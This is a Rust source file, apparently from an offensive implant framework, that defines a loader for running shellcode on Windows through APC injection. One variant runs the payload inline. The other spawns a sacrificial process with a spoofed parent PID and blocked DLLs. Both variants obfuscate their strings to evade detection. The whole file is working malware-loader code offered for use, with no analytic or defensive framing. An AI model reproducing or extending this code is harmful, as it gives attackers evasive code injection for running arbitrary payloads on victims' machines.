use obfstr::obfstr;

#[cfg(feature = "prebuild")]
pub unsafe fn loader(bin: Vec<u8>, is_need_sacrifice: bool, sacrifice_commandline: *mut i8, ppid: u32, block_dll: bool) -> Result<Vec<u8>, String> {
    use crate::win::kit::{ApcLoaderInline, ApcLoaderSacriface};
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    if is_need_sacrifice {
        let ret = ApcLoaderSacriface(bin.as_ptr(), bin.len(), sacrifice_commandline, ppid, block_dll);
        if ret.len.eq(&0) {
            return Err(obfstr!("Apc Loader Sacrifice failed!").to_string());
        }
        let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
        return Ok(str.as_bytes().to_vec());
    }
    let ret = ApcLoaderInline(bin.as_ptr(), bin.len());
    if ret.len.eq(&0) {
        return Err(obfstr!("Apc Loader Sacrifice failed!").to_string());
    }
    let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
    return Ok(str.as_bytes().to_vec());
}

#[cfg(feature = "source")]
pub unsafe fn loader(bin: Vec<u8>, is_need_sacrifice: bool, sacrifice_commandline: *mut i8, ppid: u32, block_dll: bool) -> Result<Vec<u8>, String> {
    use malefic_win_kit::dynamic::RunShellcode::{inline_apc_loader, sacriface_apc_loader};
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    if is_need_sacrifice {
        return sacriface_apc_loader(bin, sacrifice_commandline, ppid, block_dll);
    }
    let ret = inline_apc_loader(bin, true, 0);
    return ret;
}